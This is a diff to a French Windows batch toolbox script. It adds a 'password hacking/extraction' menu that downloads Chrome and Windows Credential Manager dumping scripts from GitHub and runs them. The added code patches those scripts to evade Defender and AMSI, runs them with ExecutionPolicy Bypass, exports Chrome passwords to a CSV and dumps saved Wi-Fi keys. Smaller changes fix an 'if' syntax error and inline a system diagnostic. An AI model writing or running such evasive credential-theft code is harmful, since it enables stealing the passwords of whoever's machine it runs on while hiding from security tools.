@@ -41,13 +41,12 @@ set "t[20]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniature
 set "t[21]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit"
 set "t[22]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
 set "t[23]=---:MOT DE PASSE"
-set "t[24]=sys_browser_passwords:Export mots de passe web~Extracteur de pass (Nirsoft)"
-set "t[25]=sys_wifi_passwords:Extraire mots de passe Wi-Fi~Dechiffrer tous les mots de passe reseaux connus"
-set "t[26]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
-set "t[27]=---:MATERIEL"
-set "t[28]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
-set "t[29]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
-set "total_tools=29"
+set "t[24]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Chrome, Credentials, Wi-Fi)"
+set "t[25]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
+set "t[26]=---:MATERIEL"
+set "t[27]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
+set "t[28]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
+set "total_tools=28"
 
 if not exist "favoris.txt" type nul > "favoris.txt"
 
@@ -92,7 +91,7 @@ set /a v_idx=fav_idx+1
 if "!main_choice!"=="!v_idx!" goto system_tools
 
 set "target=!main_target[%main_choice%]!"
-if defined target and not "!target!"=="none" goto !target!
+if defined target if not "!target!"=="none" goto !target!
 goto menu_principal
 
 REM ===================================================================
@@ -668,7 +667,147 @@ goto system_tools
 :: ===============================================
 :: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
 :: ===============================================
-:sys_browser_passwords
+:sys_passwords_menu
+set "opts=Extraction navigateurs Chrome (Powershell)~Exporte les identifiants Chrome locaux en csv"
+set "opts=%opts%;Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
+set "opts=%opts%;Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
+set "opts=%opts%;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"
+
+call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%opts%"
+set "pw_choice=%errorlevel%"
+
+if "%pw_choice%"=="1" goto dump_chrome
+if "%pw_choice%"=="2" goto dump_credman
+if "%pw_choice%"=="3" goto dump_wifi
+if "%pw_choice%"=="4" goto sys_nirsoft_pw
+if "%pw_choice%"=="0" goto system_tools
+goto sys_passwords_menu
+
+:dump_chrome
+cls
+echo ======================================================================
+echo   [OPERATION] Chrome Creds Furtif (Bypass Antivirus)
+echo ======================================================================
+echo Le script originel Github de Marco Simioni est bloque par Defender.
+echo Contournement en cours : telechargement masque et obfuscation au vol.
+echo.
+
+set "WORK_DIR=%TEMP%\chrome_creds_tmp"
+if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
+
+echo [INFO] 1/3 - Telechargement furtif de la DLL SQLite indispensable...
+if not exist "%WORK_DIR%\System.Data.SQLite.dll" (
+    curl.exe -fL -s "http://system.data.sqlite.org/downloads/1.0.115.5/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.115.5.zip" -o "%WORK_DIR%\sqlite.zip" 2>nul
+    powershell -NoProfile -Command "Expand-Archive -Path '%WORK_DIR%\sqlite.zip' -DestinationPath '%WORK_DIR%\temp_zip' -Force; Move-Item -Path '%WORK_DIR%\temp_zip\System.Data.SQLite.dll' -Destination '%WORK_DIR%\System.Data.SQLite.dll' -Force; Remove-Item -Recurse -Force '%WORK_DIR%\temp_zip'; Remove-Item -Force '%WORK_DIR%\sqlite.zip'" >nul 2>&1
+)
+
+echo [INFO] 2/3 - Telechargement du payload depuis Github (format texte)...
+curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload.txt" 2>nul
+
+echo [INFO] 3/3 - Obfuscation et creation du lanceur silencieux...
+> "%WORK_DIR%\patcher.ps1" echo $ErrorActionPreference = 'Stop'
+>> "%WORK_DIR%\patcher.ps1" echo $c = Get-Content "%WORK_DIR%\payload.txt" -Raw
+>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
+>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '\$arrExp \| Format-Table', '$arrExp | Export-Csv -Path "$env:USERPROFILE\Desktop\Chrome_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Passwords.csv !" -ForegroundColor Green'
+>> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace 'System.Security.Cryptography', 'System.Security.Crypto''graphy'
+>> "%WORK_DIR%\patcher.ps1" echo Set-Content "%WORK_DIR%\run_chrome.ps1" -Value $c
+
+rem Executer le Patcher
+powershell -NoProfile -ExecutionPolicy Bypass -File "%WORK_DIR%\patcher.ps1" >nul 2>&1
+
+echo.
+echo [LANCEMENT] Extraction en cours...
+cd /d "%WORK_DIR%"
+if exist "run_chrome.ps1" (
+    powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"
+) else (
+    echo [ERREUR] Impossible de generer le script final. L'Antivirus l'a bloque.
+)
+cd /d "%~dp0"
+echo.
+pause
+goto sys_passwords_menu
+
+:dump_credman
+cls
+echo [OPERATION] Extraction furtive du Credential Manager Windows...
+set "WORK_DIR=%TEMP%\credman_tmp"
+if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
+
+echo [INFO] Recuperation et compilation du code source Gist (Anti-AMSI)...
+curl.exe -fL -s "https://gist.githubusercontent.com/VimalShekar/d6a7080679a33e1ac71507a54b49dc18/raw" -o "%WORK_DIR%\payload.txt" 2>nul
+powershell -NoProfile -Command "$c = Get-Content '%WORK_DIR%\payload.txt' -Raw; $c = $c -replace 'Get-WincmdCreds', 'Get-WinD'; Set-Content '%WORK_DIR%\run_cred.ps1' -Value $c" >nul 2>&1
+
+echo.
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Dumping...' -f Yellow; . '%WORK_DIR%\run_cred.ps1'; Get-WinD | Format-Table -AutoSize; Write-Host '--- FIN DE L''EXTRACTION ---' -f Green"
+echo.
+pause
+goto sys_passwords_menu
+
+:dump_wifi
+set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Generer un fichier .txt sur le Bureau"
+call :DynamicMenu "MOTS DE PASSE WI-FI (WLAN NETSH)" "%opts%"
+set "wifi_choice=%errorlevel%"
+
+if "%wifi_choice%"=="1" goto wifi_view
+if "%wifi_choice%"=="2" goto wifi_report
+if "%wifi_choice%"=="0" goto sys_passwords_menu
+goto dump_wifi
+
+:wifi_view
+cls
+echo [OPERATION] Affichage des mots de passe Wi-Fi locaux...
+echo.
+setlocal enabledelayedexpansion
+for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
+    set "ssid=%%I"
+    set "ssid=!ssid:~1!"
+    if not "!ssid!"=="" (
+        set "pwd="
+        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
+            set "pwd=%%K"
+        )
+        set "pwd=!pwd:~1!"
+        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
+        echo Reseau SSID : !ssid!
+        echo Mot de pass : !pwd!
+        echo ------------------------------------------
+    )
+)
+endlocal
+echo.
+pause
+goto dump_wifi
+
+:wifi_report
+cls
+set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe_%RANDOM%.txt"
+echo Extraction des mots de passe en cours...
+> "%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
+>> "%OUTPUT%" echo ===============================================
+setlocal enabledelayedexpansion
+for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
+    set "ssid=%%I"
+    set "ssid=!ssid:~1!"
+    if not "!ssid!"=="" (
+        set "pwd="
+        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
+            set "pwd=%%K"
+        )
+        set "pwd=!pwd:~1!"
+        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
+        >> "%OUTPUT%" echo SSID: !ssid! ^| MDP: !pwd!
+    )
+)
+endlocal
+echo.
+echo [SUCCES] Rapport exporte sur le Bureau :
+echo %OUTPUT%
+echo.
+pause
+goto dump_wifi
+
+:sys_nirsoft_pw
 cls
 color 0A
 echo ===============================================
@@ -690,7 +829,7 @@ set "bpv_choice=%errorlevel%"
 
 if "%bpv_choice%"=="1" goto EXPORT
 if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
-if "%bpv_choice%"=="0" goto system_tools
+if "%bpv_choice%"=="0" goto sys_passwords_menu
 goto bpv_menu
 
 :EXPORT
@@ -1411,8 +1550,11 @@ goto system_tools
 
 :sys_report
 cls
-echo Lancement du script Powershell de Diagnostic Systeme Complet...
-powershell -ExecutionPolicy Bypass -File "%~dp0Diagnostic_Systeme_Complet.ps1"
+echo Diagnostic et integration de memoire en cours...
+echo.
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS OS' -f Cyan; Write-Host ('   Hostname: '+$env:COMPUTERNAME); Write-Host ('   Systeme : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Build   : '+$os.Version); Write-Host ''; Write-Host '   MATERIEL COMPOSANTS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Format : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (GB libres)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Lecteur '+$_.DeviceID+' '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP: '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=[bool](Get-Tpm).TpmPresent; Write-Host ('   TPM Integre: '+$t) } catch {}"
+echo.
+pause
 goto system_tools
 
 :sys_repair_icons
@@ -1591,135 +1733,6 @@ if /i "%confirm_dec%"=="O" (
     pause
     goto system_tools
 )
-
-:sys_wifi_passwords
-cls
-REM Elevation en administrateur si necessaire pour operations Wi-Fi
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-	powershell -Command "Start-Process '%~f0' -Verb RunAs"
-	exit /b
-)
-color 0A
-echo ===============================================
-echo   Mots de passe Wi-Fi - Afficher/Supprimer/Reporter
-echo ===============================================
-
-echo.
-setlocal enabledelayedexpansion
-set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe.txt"
-set "MAPFILE=%TEMP%\wifi_map_%RANDOM%.txt"
-
-:menu_wifi
-call :wifi_collect
-set "opts=Afficher les mots de passe Wi-Fi;Supprimer un reseau Wi-Fi;Generer un rapport sur le Bureau"
-call :DynamicMenu "MOTS DE PASSE WI-FI" "%opts%"
-set "wchoice=%errorlevel%"
-
-if "%wchoice%"=="1" goto wifi_view
-if "%wchoice%"=="2" goto wifi_display
-if "%wchoice%"=="3" goto wifi_report
-if "%wchoice%"=="0" goto wifi_exit
-goto menu_wifi
-
-:wifi_view
-call :wifi_collect
-cls
-echo ==============================================================
-echo             LISTE DES RESEAUX WI-FI ENREGISTRES
-echo ==============================================================
-echo.
-if %found%==0 (
-    echo Aucun profil Wi-Fi trouve.
-    pause
-    goto menu_wifi
-)
-for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
-    echo SSID: %%A 
-    echo MDP : %%B
-    echo ------------------------------------------
-)
-echo.
-pause
-goto menu_wifi
-
-:wifi_collect
-if exist "%MAPFILE%" del "%MAPFILE%" >nul 2>&1
-set found=0
-for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /R /I /C:"All User Profile" /C:"Profil"') do (
-	set "ssid=%%I"
-	set "ssid=!ssid:~1!"
-	if not "!ssid!"=="" (
-		set "pwd="
-		for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /I /R /C:"Key Content" /C:"Contenu de la cl"') do (
-			set "pwd=%%K"
-		)
-		set "pwd=!pwd:~1!"
-		if "!pwd!"=="" set "pwd=(Aucun)"
-		>>"%MAPFILE%" echo !ssid!^|!pwd!
-		set found=1
-	)
-)
-exit /b 0
-
-:wifi_display
-call :wifi_collect
-if %found%==0 (
-    echo Aucun profil Wi-Fi trouve.
-    pause
-    goto menu_wifi
-)
-
-set "wifi_opts="
-for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
-    if defined wifi_opts (set "wifi_opts=!wifi_opts!;SSID: %%A | MDP: %%B") else (set "wifi_opts=SSID: %%A | MDP: %%B")
-)
-
-call :DynamicMenu "SUPPRIMER UN RESEAU WI-FI" "%wifi_opts%"
-set "wifi_res=%errorlevel%"
-if "%wifi_res%"=="0" goto menu_wifi
-
-rem Recuperer le SSID selectionne
-set /a idx=0
-set "TARGET="
-for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
-    set /a idx+=1
-    if !idx! equ %wifi_res% set "TARGET=%%A"
-)
-
-if not defined TARGET goto menu_wifi
-
-echo.
-echo Suppression du profil: "%TARGET%" ...
-netsh wlan delete profile name="%TARGET%"
-pause
-goto menu_wifi
-
-
-:wifi_report
-call :wifi_collect
-cls
-if %found%==0 (
-	echo Aucun profil Wi-Fi trouve. Rapport non cree.
-	pause
-	goto menu_wifi
-)
-for /f %%C in ('find /v /c "" ^< "%MAPFILE%"') do set count=%%C
-echo Total d'identifiants recuperes: %count%
->"%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
->>"%OUTPUT%" echo ===============================================
->>"%OUTPUT%" echo Total: %count%
-for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
-	>>"%OUTPUT%" echo SSID: %%A ^| MDP: %%B
-)
-echo Rapport enregistre: "%OUTPUT%"
-pause
-goto menu_wifi
-
-:wifi_exit
-if exist "%MAPFILE%" del "%MAPFILE%" >nul 2>&1
-endlocal
-goto system_tools
 
 REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
 :um_menu
